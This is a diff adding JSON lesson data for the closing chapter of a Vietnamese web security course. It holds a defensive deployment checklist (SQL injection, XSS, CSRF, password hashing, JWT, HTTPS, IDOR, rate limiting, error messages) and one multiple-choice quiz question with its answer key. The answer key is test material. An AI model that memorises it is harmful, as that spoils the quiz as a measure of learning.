+      "content": "<section class=\"chapter\" id=\"s10\">\n      \n      <p class=\"lead\">Tổng hợp toàn bộ kiến thức thành danh sách kiểm tra thực tế — áp dụng trước khi đưa bất kỳ ứng dụng nào lên production.</p>\n\n      <h3>Checklist tổng hợp</h3>\n      <ul>\n        <li>✅ <strong>Input Validation</strong> (ch.9): Mọi input từ client đều validate ở SERVER, không chỉ client</li>\n        <li>✅ <strong>SQL Injection</strong> (ch.2): Dùng prepared statement/ORM, không nối chuỗi SQL trực tiếp</li>\n        <li>✅ <strong>XSS</strong> (ch.3): Không dùng <code>dangerouslySetInnerHTML</code>/<code>innerHTML</code> với dữ liệu chưa lọc</li>\n        <li>✅ <strong>CSRF</strong> (ch.4): Có CSRF token cho các thao tác thay đổi dữ liệu quan trọng</li>\n        <li>✅ <strong>Mật khẩu</strong> (ch.5): Hash bằng bcrypt, không lưu dạng gốc hay mã hóa 2 chiều</li>\n        <li>✅ <strong>Token/Session</strong> (ch.6): JWT_SECRET đủ mạnh, thời gian hết hạn hợp lý</li>\n        <li>✅ <strong>HTTPS</strong> (ch.7): Toàn bộ traffic qua HTTPS, không có endpoint HTTP thuần</li>\n        <li>✅ <strong>Authorization/IDOR</strong> (ch.8): Kiểm tra quyền sở hữu dữ liệu, không chỉ kiểm tra đăng nhập</li>\n        <li>✅ <strong>Secrets</strong> (ch.9): Không có API key/mật khẩu nào hardcode trong code hoặc commit lên Git</li>\n        <li>✅ <strong>Rate Limiting</strong> (ch.9): Giới hạn request cho các endpoint nhạy cảm (đăng nhập, đăng ký)</li>\n        <li>✅ <strong>Dependency</strong>: Cập nhật thư viện thường xuyên (<code>npm audit</code>) — lỗ hổng thường nằm ở thư viện bên thứ ba lỗi thời</li>\n        <li>✅ <strong>Error Message</strong>: Thông báo lỗi cho người dùng KHÔNG tiết lộ chi tiết kỹ thuật (stack trace, cấu trúc database)</li>\n      </ul>\n\n      <div class=\"box warning\">\n        <div class=\"box-title\">Cảnh báo — Error Message rò rỉ thông tin</div>\n        Trả về lỗi database thô (VD: \"Column 'password' does not exist in table 'users'\") cho client vô tình tiết lộ cấu trúc database cho kẻ tấn công. Luôn trả về thông báo lỗi CHUNG CHUNG cho người dùng, ghi log chi tiết ở phía SERVER để debug riêng.\n      </div>\n\n      <div class=\"box tip\">\n        <div class=\"box-title\">Mẹo — Tư duy cuối cùng</div>\n        Bảo mật không phải đích đến mà là <strong>quá trình liên tục</strong> — không hệ thống nào \"bảo mật tuyệt đối\". Mục tiêu thực tế là làm cho việc tấn công TỐN KÉM và KHÓ KHĂN hơn giá trị mà kẻ tấn công có thể thu được, đồng thời có khả năng PHÁT HIỆN và PHẢN ỨNG nhanh khi sự cố xảy ra.\n      </div>\n\n      \n\n      <div class=\"summary-box\">\n        <h4>🎉 Hoàn thành toàn bộ giáo trình Bảo Mật Ứng Dụng Web!</h4>\n        <p>Bạn đã đi qua <strong>10 chương / 2 phần lớn</strong>: từ OWASP Top 10, SQL Injection/XSS/CSRF, xác thực mật khẩu/JWT, đến HTTPS/TLS, phân quyền/IDOR, bảo mật API và checklist triển khai thực chiến. Kết hợp cùng kiến thức backend ở Full-Stack JS và System Design, đây là bộ kiến thức bảo mật nền tảng để xây dựng ứng dụng đáng tin cậy. Chúc bạn thành công! 🔒</p>\n      </div>\n    </section>",
+      "questions": [
+        {
+          "question": "1. Tại sao KHÔNG nên trả về lỗi database thô (raw error) trực tiếp cho client?",
+          "options": [
+            "Vì làm chậm phản hồi",
+            "Vì vô tình tiết lộ cấu trúc/công nghệ hệ thống cho kẻ tấn công",
+            "Vì tốn thêm dung lượng response"
+          ],
+          "answer": 1,
+          "explanation": ""
+        }
+      ],
+      "ids": [
+        "s10"
+      ],
+      "words": 422
+    }
+  ]
+}
